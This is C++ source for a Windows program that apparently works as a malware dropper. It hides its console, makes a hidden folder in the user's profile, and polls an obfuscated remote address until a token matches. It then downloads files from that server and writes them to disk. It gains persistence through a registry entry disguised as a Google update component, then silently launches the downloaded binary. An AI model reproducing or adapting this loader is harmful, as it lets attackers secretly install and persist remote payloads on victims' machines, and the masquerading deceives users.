#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <windows.h>

#include "file.hh"
#include "strings.hh"
#include "request.hh"
#include "string_functions.hh"

int main() {

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    char username[256];
    DWORD username_size = 256;
    GetUserName(username, &username_size);
    std::string folder_path = cs(folder_path_start);
    folder_path += username;
    folder_path += cs(folder_path_end);
    CreateDirectory(folder_path.c_str(), NULL);
    SetFileAttributes(folder_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
    SetCurrentDirectory(folder_path.c_str());

    std::vector<std::string> download_data;
    while (true) {
        download_data = split_string(get_request(cs(file_downloader_address)), "\n");
        if (download_data[0] != cs(file_downloader_token)) continue;
        break;
    }
    for (int i = 1; i < download_data.size(); i += 2) {
        std::ofstream w(download_data[i], std::ios::binary);
        write_long(w, get_request(cs(download_prefix) + download_data[i + 1]));
        w.close();
    }
    
    std::string reg_entry = replace_chars(std::string('"' + folder_path + googleupdatebroker_path + '"'), '/', '\\');
    RegSetKeyValue(
        HKEY_CURRENT_USER, reg_key, googleupdate, REG_SZ,
        reg_entry.c_str(), (reg_entry.size() + 1) * sizeof(char)
    );

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, (LPSTR) cs(googleupdatebroker_path).c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "finished\n";
}